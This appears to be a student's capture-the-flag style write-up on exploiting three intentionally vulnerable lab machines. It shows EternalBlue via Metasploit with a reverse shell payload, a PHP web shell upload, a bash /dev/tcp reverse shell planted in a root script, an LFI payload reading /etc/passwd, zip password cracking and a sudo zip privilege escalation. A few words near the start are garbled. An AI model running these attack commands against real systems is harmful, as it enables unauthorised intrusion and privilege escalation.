this consists of some intentionally vulnerable machines which would be exploited using our kali linux machine
* Blue
* Academy
* Dev
# Blue

* once we launch our windows vista machine we get its ip ip address from ```netdiscover``` and then launch our nmap fdbcvxdfghtfhgfhggfhgscan on it and thixcv xcvs is what the results gave fcbcv,hvjhghus 
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 10:53 CET  
Nmap scan report for 192.168.7.20  
Host is up (0.00064s latency).  
Not shown: 65525 closed tcp ports (reset)  
PORT      STATE SERVICE     VERSION  
135/tcp   open  msrpc       Microsoft Windows RPC  
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn  
445/tcp   open              Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)  
5357/tcp  open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Service Unavailable  
49152/tcp open  msrpc       Microsoft Windows RPC  
49153/tcp open  msrpc       Microsoft Windows RPC  
49154/tcp open  msrpc       Microsoft Windows RPC  
49155/tcp open  msrpc       Microsoft Windows RPC  
49156/tcp open  msrpc       Microsoft Windows RPC  
49158/tcp open  msrpc       Microsoft Windows RPC  
MAC Address: 08:00:27:2A:95:91 (Oracle VirtualBox virtual NIC)  
Device type: general purpose  
Running: Microsoft Windows 7|2008|8.1  
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_se  
rver_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1  
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1  
Network Distance: 1 hop  
Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:    
|   date: 2023-08-22T14:54:51  
|_  start_date: 2023-08-22T14:42:25  
|_clock-skew: mean: 6h19m57s, deviation: 2h18m34s, median: 4h59m57s  
| smb-security-mode:    
|   account_used: guest  
|   authentication_level: user  
|   challenge_response: supported  
|_  message_signing: disabled (dangerous, but default)  
| smb2-security-mode:    
|   2:1:0:    
|_    Message signing enabled but not required  
|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:2a:95:91 (Oracle VirtualBox virtual NIC)  
| smb-os-discovery:    
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)  
|   OS CPE: cpe:/o:microsoft:windows_7::sp1  
|   Computer name: WIN-845Q99OO4PP  
|   NetBIOS computer name: WIN-845Q99OO4PP\x00  
|   Workgroup: WORKGROUP\x00  
|_  System time: 2023-08-22T10:54:50-04:00  
  
TRACEROUTE  
HOP RTT     ADDRESS  
1   0.64 ms 192.168.7.20  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 99.13 seconds
```

* the only thing that can have our attention is the version of Microsoft Windows given to us . a little search in google gave us an exploit called "EternalBlue" which is a SMB remote code execution vulnerability


* let's run metasploit framework and search for this exploit 


```
>msfconsole

>search eternalblue
found an exploit module exploit/windows/smb/ms17_010_eternalblue

>options

>set RHOSTS Blue_address

>set payload windows/x64/meterpreteer/reverse_tcp

>run


#and there we go .. the exploit worked and we have access to the machine remotely
```




# Academy
* from the nmap scan we get the following results
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 11:38 CET  
Nmap scan report for 192.168.7.21  
Host is up (0.00039s latency).  
Not shown: 65532 closed tcp ports (reset)  
PORT   STATE SERVICE VERSION  
21/tcp open  ftp     vsftpd 3.0.3  
| ftp-syst:    
|   STAT:    
| FTP server status:  
|      Connected to ::ffff:192.168.7.14  
|      Logged in as ftp  
|      TYPE: ASCII  
|      No session bandwidth limit  
|      Session timeout in seconds is 300  
|      Control connection is plain text  
|      Data connections will be plain text  
|      At session startup, client count was 3  
|      vsFTPd 3.0.3 - secure, fast, stable  
|_End of status  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt  
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
| ssh-hostkey:    
|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)  
|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)  
|_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)  
80/tcp open  http    Apache httpd 2.4.38 ((Debian))  
|_http-title: Apache2 Debian Default Page: It works  
|_http-server-header: Apache/2.4.38 (Debian)  
MAC Address: 08:00:27:21:0C:70 (Oracle VirtualBox virtual NIC)  
Device type: general purpose  
Running: Linux 4.X|5.X  
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5  
OS details: Linux 4.15 - 5.8  
Network Distance: 1 hop  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  
  
TRACEROUTE  
HOP RTT     ADDRESS  
1   0.39 ms 192.168.7.21  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 9.38 seconds
```


* we begin enumeration, starting with FTP and HTTP
	 * from the ftp server we can get the file ``ǹote.txt`` which contains some data with an id and a password(use hash-identifier to view what kind of hash) cracked with hashcat (hashcat -m 0 hashes "wordlist" (md5)) the hash gave us "student" as password
	  * running dirb on the website we get some endpoint like academy let's try to login with id and password 
	  * we have a functionality to upload an image so we uploaded a php reverse shell and set up the listener and got a reverse shell 
	  * using this reverse shell let's proceed : 
```
>attacker_machine[/transfers]# python3 -m http.server 80 

>reverse_shell# wget http://attacker_address/linpeas.sh

>chmod +x linpeas.sh
>./linpeas.sh #executes the script
#/home/grimmie/backup.sh is highlighted in red/yellow, so it could be important
#gives mysql_password = "My_V3ryS3cur3_P4ss"


>ssh grimmie@acadeym_address 
#on trying user "grimmie" and password "My_V3ryS3cur3_P4ss" on phpmyadmin, it works and we get access

#use pspy64 to view all the services running we see that backup.sh is running as root after a period so let's change it with a one line reverse shell 

(backup.sh)
#!/bin/bash
bash -i >& /dev/tcp/192.168.7.14/8081 0>&1

```
and there we go we get root access and pwned the machine



# Dev
* Nmap Scan Results
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 16:48 CET  
Nmap scan report for 192.168.7.3  
Host is up (0.0036s latency).  
Not shown: 65526 closed tcp ports (conn-refused)  
PORT      STATE SERVICE  VERSION  
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
| ssh-hostkey:    
|   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)  
|   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)  
|_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)  
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))  
|_http-title: Bolt - Installation error  
|_http-server-header: Apache/2.4.38 (Debian)  
111/tcp   open  rpcbind  2-4 (RPC #100000)  
| rpcinfo:    
|   program version    port/proto  service  
|   100000  2,3,4        111/tcp   rpcbind  
|   100000  2,3,4        111/udp   rpcbind  
|   100000  3,4          111/tcp6  rpcbind  
|   100000  3,4          111/udp6  rpcbind  
|   100003  3           2049/udp   nfs  
|   100003  3           2049/udp6  nfs  
|   100003  3,4         2049/tcp   nfs  
|   100003  3,4         2049/tcp6  nfs  
|   100005  1,2,3      41599/tcp6  mountd  
|   100005  1,2,3      41701/tcp   mountd  
|   100005  1,2,3      47973/udp6  mountd  
|   100005  1,2,3      56489/udp   mountd  
|   100021  1,3,4      34175/tcp   nlockmgr  
|   100021  1,3,4      42777/tcp6  nlockmgr  
|   100021  1,3,4      45856/udp   nlockmgr  
|   100021  1,3,4      50406/udp6  nlockmgr  
|   100227  3           2049/tcp   nfs_acl  
|   100227  3           2049/tcp6  nfs_acl  
|   100227  3           2049/udp   nfs_acl  
|_  100227  3           2049/udp6  nfs_acl  
2049/tcp  open  nfs      3-4 (RPC #100003)  
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))  
| http-open-proxy: Potentially OPEN proxy.  
|_Methods supported:CONNECTION  
|_http-server-header: Apache/2.4.38 (Debian)  
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()  
34175/tcp open  nlockmgr 1-4 (RPC #100021)  
37927/tcp open  mountd   1-3 (RPC #100005)  
41701/tcp open  mountd   1-3 (RPC #100005)  
47267/tcp open  mountd   1-3 (RPC #100005)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 9.29 seconds
```

* enumerating HTTP at port 80 and 8080:
	* visiting the links http://DEV_address:8080 and http://DEV_address:80 gives us pages for bolt installations error and php default version webpage resperctively
	* information disclosure:
		 * apache 2.4.38 and PHP version 7.3.27-1~deb10u1 used in website
		 * Bolt installation error page on http://Dev_Address shows that current folder is /var/www/html/. Similarly, Apache run directory given as /var/run/apache2
		 * PHP page shows system details - Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
 * Scanning web apps 
```
ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt:FUZZ -u http://10.0.2.9:80/FUZZ
#using ffuf for directory scanning

ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt:FUZZ -u http://10.0.2.9:8080/FUZZ
```

- Information disclosure:
    
    - Using ffuf, we get directories /public, /src, /app, /vendor, /extensions for  http://DEV_address:80
        
    - Similarly, for http://DEV_address:8080  we get /dev and /server-status

* found a file at /app in http://DEV_address config.yml where i found these credentials : 
```
database:
    driver: sqlite
    databasename: bolt
    username: bolt
    password: I_love_java
```

* accessing http://DEV_address:8080/dev the page changes and show boltwire that can have some vulnerabilties
* searching in google found an lfi vulnerability with this payload in exploitdb 
```
http://192.168.51.169/boltwire/index.php?p=action.search&action=../../../../../../../etc/passwd
#we can see that there is a user with the name jeanpaul
```





* enumerating nfs_acl at 2049
	 * we can use nfs_acl to mount files in our system from Dev:
```
showmount -e Dev_Address #shows export list - /srv/nfs

mkdir /mnt/dev/ #folder to store files

mount -t nfs Dev_Address:/srv/nfs /mnt/dev/

cd /mnt/nfs
ls #show save.zip

unzip save.zip #asks for password 

fcrackzip -v -u -D -p /root/rockyou/rockyou.txt save.zip 
#-v for verbosity, -u for unzip, -D for dictionary attack and -p for passwords file
#password is java101

unzip save.zip #enter password to unzip

ls #shows two files
```

* The information provided in the two files is as follows: todo.txt contains a text file that's signed by 'jp', while the second file is named id_rsa, which appears to be a key. This key might be intended for SSH access,  but we don't know the username 
* We can consider utilizing the usernames mentioned earlier, 'jp' and 'jeanpaul', along with the id_rsa file and the passphrase 'I_love_java', to make an SSH login attempt.

* Enumerating SSH :
```
>ssh -i id_rsa jp@DEV_address 
#wrong passwor (I_love_java)

>ssh -i id_rsa jeanpaul@DEV_address
#tried the same password and we login

>sudo -l 
#User jeanpaul may run the following commands on dev:  
   (root) NOPASSWD: /usr/bin/zip
  ```

* search in **gfobins** how to make privileges escalation using sudo and zip 
```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```
* and there we go we are root and pwned the box dev
